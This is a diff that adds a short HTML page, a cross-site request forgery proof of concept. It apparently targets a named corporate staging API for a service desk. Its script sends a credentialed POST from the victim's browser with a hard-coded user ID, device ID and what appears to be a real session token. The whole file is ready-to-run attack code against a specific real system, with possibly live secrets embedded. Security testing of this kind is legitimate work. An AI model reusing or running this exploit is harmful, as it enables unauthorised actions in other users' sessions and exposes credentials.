@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h3>Fetch CSRF PoC</h3>
+    <button onclick="send()">Send CSRF</button>
+
+    <script>
+      function send() {
+        fetch("https://vzservicedeskweb-stg.mediasearch.verizon.com/vzservicedeskapi/fms/viewissues", {
+          method: "POST",
+          credentials: "include", // REQUIRED for CSRF
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            userId: "w01m64a39",
+            appType: "FTV",
+            deviceId: "Test-111-222-333",
+            sdToken: "CQCmAZ6kYI1JT98G/X4+XAIRKBFpEy+5oMkfXxOtrM8="
+          })
+        })
+        .then(r => r.text())
+        .then(t => console.log("Response:", t))
+        .catch(e => console.error("Blocked:", e));
+      }
+    </script>
+  </body>
+</html>
